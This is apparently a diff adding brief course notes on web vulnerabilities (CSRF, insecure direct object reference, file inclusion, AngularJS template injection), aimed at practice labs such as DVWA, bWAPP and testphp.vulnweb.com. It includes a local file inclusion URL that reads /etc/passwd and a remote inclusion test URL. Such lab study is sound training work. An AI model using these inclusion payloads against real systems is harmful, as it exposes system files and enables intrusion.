@@ -1,0 +1,35 @@
+session 4 :::
+
+
+Session :
+
+-CSRF
+program website DVWA
+
+http://testphp.vulnweb.com/login.php
+
+
+-Insecure DOR (Order Tickets)
+
+http://testphp.vulnweb.com/login.php
+
+-Insecure DOR (Order Secret)
+
+http://testphp.vulnweb.com/login.php
+
+
+-Remote & Local File Inclusion (RFI/LFI)
+
+Local: 
+/etc/passwd
+http://192.168.1.24/bWAPP/rlfi.php?language=lang_en.php&action=go
+http://192.168.1.24/bWAPP/rlfi.php?language=/etc/passwd
+
+Remote:
+https://google.com
+http://192.168.1.24/bWAPP/rlfi.php?language=lang_en.php&action=go
+http://192.168.1.24/bWAPP/rlfi.php?language=https://google.com/&action=go
+
+-template injection angular js
+
+https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs
